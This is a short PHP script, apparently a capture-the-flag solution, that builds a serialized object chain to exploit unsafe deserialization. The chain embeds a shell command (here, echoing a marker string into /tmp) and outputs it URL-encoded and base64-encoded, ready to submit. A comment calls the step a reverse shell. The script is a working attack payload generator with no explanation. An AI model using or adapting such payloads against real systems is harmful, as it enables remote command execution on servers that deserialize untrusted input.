<?php
class b {
    private $i_want_2_listen_2_MaoZhongDu;
    public function __construct($a)
    {
        $this->i_want_2_listen_2_MaoZhongDu = $a;
    }
}

class c {}

class d {}

class e {}

$b = new b('echo "myj2019214033" > /tmp/myj');
$c = new c();
$d = new d();
$d->value = $b; // 反弹shell
$e = new e();
$e->afkl = $d;
echo urlencode(base64_encode(serialize([$c, $e])));
